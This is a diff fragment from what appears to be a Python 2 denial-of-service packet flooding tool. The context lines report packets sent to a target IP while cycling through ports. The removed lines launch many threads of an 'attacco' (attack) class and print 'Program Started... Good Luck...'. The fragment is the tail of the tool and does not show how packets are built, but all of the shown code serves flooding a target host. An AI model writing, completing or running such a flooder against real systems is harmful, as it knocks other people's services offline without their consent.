@@ -357,13 +357,3 @@ while True:
      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
      if port == 65534:
        port = 1
-
-for x in xrange(thread):
-    attacco().start()
-    time.sleep(0.003)	
-print "Program Started..."
-print "Good Luck..."
-print "Ctrl + Z Stop Program..."
-nload = 0
-while not nload:
-    time.sleep(1)
